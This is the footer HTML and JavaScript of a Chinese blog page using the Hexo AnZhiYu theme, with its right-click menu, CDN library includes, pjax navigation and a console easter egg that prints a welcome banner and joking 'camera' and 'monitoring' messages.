anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("03/01/2024 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 stoocea 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="java"></div><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>